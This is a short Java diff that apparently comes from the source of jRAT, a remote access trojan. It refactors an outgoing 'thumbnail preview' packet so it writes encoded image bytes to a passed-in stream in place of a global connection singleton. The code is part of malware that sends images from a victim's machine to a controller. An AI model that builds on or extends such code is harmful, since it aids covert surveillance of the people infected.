@@ -8,7 +8,6 @@ import javax.imageio.ImageIO;
 
 import se.jrat.common.io.StringWriter;
 import se.jrat.common.utils.ImageUtils;
-import se.jrat.stub.Connection;
 
 public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
 
@@ -27,8 +26,8 @@ public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
 
 		byte[] buffer = ImageUtils.encode(image);
 
-		Connection.instance.getDataOutputStream().writeInt(buffer.length);
-		Connection.instance.getDataOutputStream().write(buffer);
+		dos.writeInt(buffer.length);
+		dos.write(buffer);
 	}
 
 	@Override
